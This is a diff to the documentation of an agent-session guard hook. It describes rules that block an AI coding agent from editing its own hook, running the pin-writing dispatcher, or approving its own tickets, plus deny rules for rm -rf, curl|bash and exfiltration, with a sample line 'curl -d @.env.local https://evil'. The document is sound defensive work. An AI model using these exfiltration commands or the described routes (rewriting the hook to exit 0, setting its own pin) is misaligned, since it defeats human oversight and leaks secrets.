@@ -14,7 +14,8 @@ Runs before every tool call. Exit 2 = block with reason. Exit 0 = allow.
 | `git commit` while on `main`/`master` | Bash | `git commit` + protected branch | Same — no direct commits to `main` |
 | Edit/Write into a **different worktree** | Edit/Write | target's owning worktree (via `git worktree list`) ≠ this session's | A write to another checkout (classically the main checkout, reached via a persisted `cd`) skips every branch guard and lands there **silently** — tests here still pass against the unmodified files. The block message prints the corrected in-worktree path. Fails open; same-worktree writes and paths outside the repo (scratchpad, `~/.claude`, `/tmp`) are unaffected |
 | **Edit/Write/NotebookEdit of the hook machinery** | Edit/Write/NotebookEdit | target resolves under `.claude/hooks/**`, or is `.claude/settings.json` / `.claude/settings.local.json` | **GAP 1 (self-edit).** Under `defaultMode: bypassPermissions` this hook *is* the entire local gate; a session that rewrites it to `sys.exit(0)` disables every guard for the rest of the session (command hooks re-read the file per call). These files may only be edited **outside** an agent session |
-| **Shell rewrite of the hook machinery** | Bash | redirect into / `sed -i` / `cp`·`mv`·`rm`·`tee` / `git checkout`·`restore`·`reset`·`clean` targeting `.claude/hooks/**` or `.claude/settings*.json` | Same as above via the Bash arm. Reads and `git add`/`git commit` are **not** matched, so a session can still stage/commit a hook change authored the right way |
+| **Shell rewrite of the hook machinery** | Bash | redirect into / `sed -i` / `cp`·`mv`·`rm`·`tee` / `git checkout`·`restore`·`reset`·`clean` / any `python`·`node`·`ruby` naming `.claude/hooks/**` or `.claude/settings*.json` **inside this project** | Same as above via the Bash arm. Reads (`cat`, `grep`, `sed -n`) and `git add`/`git commit` are **not** matched, so a session can still stage/commit a hook change authored the right way. Scoped to *this* checkout since v5 — another repo's hooks are not ours |
+| **Invoking `pipeline_dispatch_local.py`** | Bash | the script named by any command except a read or `--selftest` | It writes the dispatcher **pin**, and a session that can place its own pin can retarget itself at another ticket or widen its own scope fence (`docs/PIPELINE-CONTRACT.md` §3). The script's own agent-environment check is tamper-*evident*, not tamper-proof — same user, same environment — so enforcement lives here. A human runs it from their own terminal |
 | `rm -rf` / `rm --recursive` | Bash | `rm` with recursive+force flags | Accidental mass deletion |
 | `curl/wget \| bash` | Bash | pipe to shell | Supply-chain attack vector (inbound) |
 | **Outbound exfiltration** | Bash | `curl`/`wget`/`scp`/`sftp`/`nc` to a **non-allowlisted** host *plus* an upload/data flag (`-d`/`--data`/`--post-*`/`-F`/`-T`/`@file`), a `$var`-in-URL, or a raw socket / scp push | **GAP 3 (egress).** Under bypassPermissions `curl -d @.env.local https://evil` runs with no prompt. Allowlist: localhost/loopback, `*.github.com`, `*.githubusercontent.com`, `api.anthropic.com`, `*.supabase.co/.com` (domain-boundary suffix match, so `evil-github.com` is **not** allowed). Plain inbound GETs/downloads stay allowed |
@@ -71,6 +72,66 @@ Runs before every tool call. Exit 2 = block with reason. Exit 0 = allow.
 > ignores stdout, so every denial had been surfacing to the model as
 > "PreToolUse:… hook error: … No stderr output" with the reason lost. Verified
 > by a 25-case block/allow battery (see PR).
+
+> **v5 (2026-08-25) — the pipeline guard layer, plus three false-positive fixes.**
+> Adds the six pipeline-scoped guards below and fixes three ways the existing
+> guards matched *mentions* rather than *operations*. **(1) `sed` as a rewrite:**
+> `sed`/`perl` now require an in-place flag, so `sed -n '1,70p' <hook>` — a read —
+> no longer blocks; and the Bash arm is **scoped to this checkout**, so reading or
+> editing *another* repo's `.claude/hooks/**` (a scratch clone) is no longer
+> treated as self-edit. A *relative* path stays protected regardless of where it
+> resolves, so `../../.claude/hooks/x` is not an escape. **(2) Prose scanning:**
+> `_strip_prose` moved to module scope and now runs at **four** scanning sites
+> instead of one — a PR body or commit message quoting `.env.local` (or the words
+> `git commit`) no longer trips the secret-file or branch guards. `--body-file`,
+> `--notes` and `-F` joined the stripped-flag list. Known limit, stated plainly: a
+> **heredoc** body is *not* stripped, because doing so generally would blind the
+> guard to `bash <<'EOF' … rm -rf / … EOF`; pass long text with `--body-file`.
+> **(3) Local dispatch:** invoking `scripts/pipeline_dispatch_local.py` is now
+> blocked outright (see the table). Verified by a 245-case battery
+> (`npm run test:hooks`), of which 95 are new.
+
+### Pipeline guards (v5) — optional, off unless `delivery.json` exists
+
+Six guards from `docs/PIPELINE-CONTRACT.md`. They are **inert** unless
+`delivery.json` is present at the repo root — the contract's single discriminator
+(§2). *Off* is not *broken*: the existence test runs before anything that can
+fail, so a project that never opted in behaves exactly as it did before. A
+fail-closed guard whose precondition is missing would block every `Edit`/`Write`,
+and because this file is self-protected the agent could not repair it.
+
+| Guard | Active when | Enforces |
+|---|---|---|
+| `pin-binding` | configured **and** `session_mode: ticket` | A valid, unexpired pin exists and its `worktree` matches the derived session root |
+| `ticket-branch` | configured **and** `branch.requireTicketId` | The branch carries the pinned ticket ID, lower-cased |
+| `scope-fence` | configured **and** pinned | No writes to `autonomy.riskPaths` (CI workflows, `delivery.json`, hook machinery) — a session must not edit what grades it |
+| `lifecycle-label` | configured **and** pinned | The session does not set or clear its own `agent:*` / `blocked:*` labels |
+| `self-approval` | configured | The session never moves a ticket into `ready`. Unconditional — there is no in-session allow-path and no config value that opens one |
+| `telemetry-required` | configured | **Partial here.** See the note below |
+
+**Where authority comes from.** Config *values* are read from the **committed
+copy on the default branch**, never the working tree — the working-tree copy sits
+inside the agent's own worktree, so trusting it would let a session raise its own
+budgets or blank the state ID a guard matches on. The pin is read from
+**outside** the worktree at `<pinsRoot>/<sha256(session root)[:16]>.json`. Neither
+the branch name, a PR body, nor an environment variable is authority for any of
+it.
+
+**Fail direction.** Write-blocking guards fail **closed** — including on an
+*expired* pin in ticket mode, because a lapsed binding is broken (unlike one never
+claimed) and otherwise simply *waiting* would be an escape. Checks that merely
+*withhold* autonomy from an unpinned session fail **open**, so a human working ad
+hoc in a configured repo is never bricked.
+
+> **`telemetry-required` is only half-enforced here, deliberately.** Its counting
+> half — "a terminal run posts exactly one valid telemetry block" — belongs to the
+> §8 safe-outputs validator, which runs *out of session* and is **not ported to
+> this repo**: there is no requests-file emitter here yet. A PreToolUse hook
+> cannot observe "the turn ended without telemetry", and a fail-closed Stop-time
+> guard with no way to emit would brick every session. What the hook *does*
+> guarantee is that the reporting **channel** stays open — a comment on the pinned
+> ticket, including one whose target it cannot resolve, is never blocked — and
+> that it cannot be redirected at another ticket. Pinned by five battery cases.
 
 ---
 
